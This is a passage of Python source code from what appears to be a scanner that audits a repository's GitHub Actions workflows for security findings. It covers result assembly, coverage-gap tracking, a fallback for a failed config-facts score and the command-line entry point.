                    # the actual workflow code (SKILL.md Phase 2.5)
                    # and patches them onto each finding before piping
                    # the JSON to report.py.
                    #
                    # Transient, stripped by `_dedupe_occurrences`: the exact
                    # text that matched, so two DIFFERENT sinks on one line
                    # collapse into one occurrence that names both rather than
                    # one that silently names only the first.
                    "_match_text": hit.match_text,
                })

    findings = _dedupe_occurrences(findings)

    # Coverage-gap surface: a workflow that can't be read or parsed yields
    # nothing from the detectors, which is indistinguishable from "scanned
    # clean". Probe each file once and record the failures so report.py can
    # surface them loudly — a skipped file must never read as a clean one.
    scan_incomplete: list[dict[str, str]] = []
    for wf in workflow_files:
        reason = _probe_scannability(wf)
        if reason is not None:
            rel = str(wf.relative_to(root))
            logger.warning("coverage gap: %s — %s", rel, reason)
            scan_incomplete.append({"workflow_file": rel, "reason": reason})
    # A match a detector found but could not anchor to a line is a coverage gap
    # too — but a DIFFERENT one, kept in its own list. See `_DROPPED_MATCHES`:
    # the file here read and parsed fine, so its config facts are perfectly
    # measurable; only one `run:` step went unscanned.
    #
    # Split by KIND. Only an unanchorable `run:` step belongs under the
    # report's "…were NOT scanned…" headline — a computed `working-directory:`
    # is a real gap the headline does not describe, and a pin suppression is
    # not a gap at all.
    dropped_matches: list[dict[str, str]] = []
    coverage_notes: list[dict[str, str]] = []
    suppressed_findings: list[dict[str, str]] = []
    _by_kind = {
        _KIND_UNANCHORED: dropped_matches,
        _KIND_NOT_SCANNED: coverage_notes,
        _KIND_SUPPRESSED: suppressed_findings,
    }
    for dropped in _DROPPED_MATCHES:
        rel = _repo_relative(dropped["file"], root)
        kind = dropped.get("kind", _KIND_UNANCHORED)
        if kind != _KIND_SUPPRESSED:
            logger.warning("coverage gap (%s): %s — %s", kind, rel,
                           dropped["reason"])
        else:
            logger.debug("suppressed finding: %s — %s", rel, dropped["reason"])
        entry = {"workflow_file": rel, "reason": dropped["reason"]}
        bucket = _by_kind.get(kind, dropped_matches)
        if entry not in bucket:
            bucket.append(entry)

    logger.debug(
        "scan complete: %d findings, %d coverage gap(s), %d dropped match(es)",
        len(findings), len(scan_incomplete), len(dropped_matches),
    )
    _total_s = time.monotonic() - _t_scan_start
    logger.debug(
        "Timing: scan_total=%.1fs activity_enrich=%.1fs (concurrent) over %d workflow(s)",
        _total_s, _enrich_s, len(workflow_files),
    )
    return {
        "scanned_at": _dt.datetime.now(_dt.timezone.utc)
        .isoformat(timespec="seconds")
        .replace("+00:00", "Z"),
        "scanned_workflows": len(workflow_files),
        "repo_root": str(root),
        "repo": repo,
        "commit_sha": _git_commit_sha(root),
        # True when the audited checkout had uncommitted/untracked changes at
        # scan time — the scanned bytes then are not the bytes at `commit_sha`,
        # and the report says so on its audited-commit row.
        "repo_tree_dirty": _repo_tree_dirty(root),
        "skill_commit_sha": _skill_commit_sha(),
        # True when the skill's tracked source had uncommitted edits at scan
        # time — so `skill_commit_sha` alone may not reflect the code that ran.
        # report.py marks the recorded commit `-dirty` so provenance is honest.
        "skill_tree_dirty": _skill_tree_dirty(),
        # Per-phase wall-clock so a slow run shows WHERE the time went
        # (Tier-0 timing). The orchestrator folds these into its Phase 6
        # `Timing:` summary.
        "timings": {
            "run_start_epoch": round(_scan_start_epoch, 3),
            "activity_enrich_s": round(_enrich_s, 2),
            "scan_total_s": round(_total_s, 2),
        },
        "gh_checks": gh_checks,
        "gh_check_details": gh_check_details,
        # Every catalog pattern this scan actually evaluated. A chain that
        # failed to load would otherwise be indistinguishable from a chain
        # that found nothing; verify_report.py compares this set against the
        # ten-vector manifest so a silently-shrunk catalog goes red.
        "catalog_patterns_evaluated": sorted(e.pattern for e in catalog),
        "findings": findings,
        # Workflow files that couldn't be read or YAML-parsed, so the static
        # detectors never ran on them. Always set (empty when every file
        # scanned) so report.py can rely on the key. Non-empty means the
        # report's "clean" verdict has holes — see report.py's gap banner.
        "scan_incomplete": scan_incomplete,
        # `run:` steps a detector could not anchor to a raw line and therefore
        # never scanned for injection sinks. A separate channel from
        # `scan_incomplete` on purpose: the FILE parsed fine, so its config
        # facts stay measurable, while coverage still degrades to PARTIAL and
        # the report names the step count and the file count honestly.
        "dropped_matches": dropped_matches,
        # A real coverage gap that is NOT an unanchorable run step — a
        # computed `working-directory:`, a `ref:` chosen at run time, shell
        # that would not parse. Its own key so the report can name it in its
        # own words instead of under a headline that misdescribes it.
        "coverage_notes": coverage_notes,
        # Findings the scanner REACHED and deliberately did not report, above
        # all a fetch pinned to a full commit id. Informational: this must
        # never degrade coverage, or a repository that did exactly what the fix
        # recipe says is told its report is not a clean result.
        "suppressed_findings": suppressed_findings,
        # The config facts + the security component of the CI Score
        # (ci-secure owns this number; the ten vectors above stay
        # findings-only and never enter it). Unscannable workflows force
        # every workflow-scoped fact to UNMEASURED, never a silent pass — but
        # a merely unanchored `run:` step does not: the file parsed, so the
        # facts about it are real.
        #
        # **The AGGREGATE here is machine-only and is deliberately never
        # rendered to a reader** — a deliberate design choice. The block's
        # CONTRACT is unchanged because ci-advisor blends from it: same keys,
        # same `fact_id`s, same `outcome`s, same `score`/`passed`/
        # `scored_count`/`applicable_count`/`unmeasured`/`constants`/
        # `registered`. Only human-readable prose inside it moved (a `fact`
        # sentence and the crash-path `reason`, both of which the report
        # PRINTS and so had to stop referring to a score) — so it is
        # shape-compatible, not byte-identical. Bind to the ids, not the
        # prose. `report.py`
        # renders the FACTS as a `## 🧰 Config hygiene checks — pass/fail`
        # table and no number at all. A hygiene aggregate labelled "Security
        # score" overclaims what a handful of config observations can say and collides
        # with the vector scan printed beside it — an early run read "5 of 6
        # facts pass" above ten green rows as a contradiction.
        #
        # This exact back-and-forth has already happened ONCE, in the other
        # direction: a review restored the rendered score on the argument that
        # "a score computed but not shown is a number the reader cannot
        # check". That argument is answered, not overlooked — the number is
        # not shown to the reader because it is not FOR the reader.
        # `tests/verify_report.py::check_no_rendered_security_score` makes the
        # invisibility an invariant. Do not "fix" it again.
        "security_score": _compute_security_score(root, workflow_files,
                                                  scan_incomplete, repo),
    }


def _compute_security_score(
    root: Path, workflow_files: list[Path],
    scan_incomplete: list[dict[str, str]],
    repo: str | None = None,
) -> dict[str, Any]:
    """Isolated so a facts-layer crash degrades to an honest 'unmeasured'
    block instead of taking down the whole scan (the vectors are the product's
    core; the score must never be the reason a scan dies)."""
    try:
        import config_facts
        return config_facts.compute_config_facts(root, workflow_files,
                                                 scan_incomplete, repo=repo)
    except Exception as exc:                                  # noqa: BLE001
        logger.warning("security_score unavailable: %r", exc)
        # Same key set as facts_to_score, so a consumer never has to branch on
        # which path produced the block — a `constants` KeyError that fires
        # only on the failure path is the worst place to discover the gap.
        return {"facts": [], "score": None, "passed": 0, "scored_count": 0,
                "applicable_count": 0, "unmeasured": [],
                "constants": {"rule": "100 * passed / scored; pass/fail only, "
                                      "no weights, no partial credit"},
                # `reason` is READER-VISIBLE: report.py prints it in the
                # "Nothing here was checked" headline whenever `facts` is
                # empty, which is exactly this path. So it must not talk about
                # a score — the report renders none by design, and "this is NOT a score of 100" in a report with no score
                # is the removed contract leaking back at the reader.
                "reason": f"config-facts layer failed: {exc!r} — no config "
                          "fact could be checked", "registered": None}


def _default_catalog_path() -> Path:
    return _THIS_DIR.parent / "references" / "security-patterns.md"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Scan a repo's GitHub Actions workflows for security findings.",
    )
    parser.add_argument(
        "--catalog",
        type=Path,
        default=_default_catalog_path(),
        help="Path to security-patterns.md (default: bundled catalog).",
    )
    parser.add_argument(
        "--root",
        type=Path,
        default=Path.cwd(),
        help="Repo root to scan (default: cwd).",
    )
    parser.add_argument(
        "--repo",
        type=str,
        default=None,
        help="owner/repo to enrich findings with workflow activity (optional).",
    )
    parser.add_argument(
        "--gh-impostor",
        choices=["auto", "on", "off"],
        default="auto",
        help=(
            "The P14.11 impostor-SHA check needs the GitHub API. auto "
            "(default): run iff gh is authenticated; on: require it (error "
            "if gh unavailable); off: skip (recorded loudly in gh_checks)."
        ),
    )
    args = parser.parse_args(argv)

    root = args.root.resolve()
    if not (root / ".github" / "workflows").is_dir():
        print(
            f"ERROR: no .github/workflows directory under {root}",
            file=sys.stderr,
        )
        return 1

    if args.repo:
        # Validate the format up front so a malformed value (e.g. a full URL,
        # an `owner` with no slash, or a `git@github.com:owner/repo.git`
        # remote) surfaces as an error instead of silently dropping activity
        # enrichment on every finding.
        from gh_utils import validate_repo_format  # noqa: E402
        ok, err = validate_repo_format(args.repo)
        if not ok:
            print(f"ERROR: --repo: {err}", file=sys.stderr)
            return 2

    try:
        catalog = load_catalog(args.catalog)
    except (FileNotFoundError, ValueError) as e:
        print(
            f"ERROR: the pattern catalog is broken — {e}\n"
            f"       This is a COVERAGE FAILURE, not a clean scan: the "
            f"affected chain would never be evaluated. Reinstall the skill "
            f"(or fix {args.catalog}) and re-run.",
            file=sys.stderr,
        )
        return 1

    gh_skip_reason = _DEFAULT_GH_SKIP_REASON
    if args.gh_impostor == "on":
        from gh_utils import check_prereqs  # noqa: E402
        if not check_prereqs():
            print(
                "ERROR: --gh-impostor=on but gh is not authenticated "
                "(gh auth login)",
                file=sys.stderr,
            )
            return 2
        gh_impostor = True
    elif args.gh_impostor == "auto":
        from gh_utils import check_prereqs  # noqa: E402
        gh_impostor = check_prereqs()
    else:
        gh_impostor = False
        gh_skip_reason = "disabled via --gh-impostor=off"

    try:
        result = scan(
            catalog, root, repo=args.repo, gh_impostor=gh_impostor,
            gh_skip_reason=gh_skip_reason,
        )
    except CoverageError as e:
        print(f"ERROR: coverage failure — {e}", file=sys.stderr)
        return 1
    json.dump(result, sys.stdout, indent=2)
    sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
